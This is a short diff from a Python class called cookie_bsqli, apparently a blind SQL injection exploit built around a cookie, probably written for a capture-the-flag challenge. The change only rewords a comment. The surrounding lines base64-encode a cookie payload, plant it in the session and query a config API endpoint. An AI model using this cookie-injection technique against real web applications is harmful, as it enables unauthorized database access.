@@ -109,7 +109,7 @@ class cookie_bsqli:
 		b64_cookie_payload = b64encode(cookie_payload).decode()#.replace('=', '%3D').replace('\\','')
 
 		"""
-		Now set the current session cookie's to our object injected cookie + nginxatsu_session
+		Now set the current session cookie's to our injected cookie + nginxatsu_session
 		"""
 		self.session.cookies.set(cookie_id, b64_cookie_payload, domain=re.split("//|:", BASE_URL)[2])
 		r = self.session.get(BASE_URL+'api/configs/')
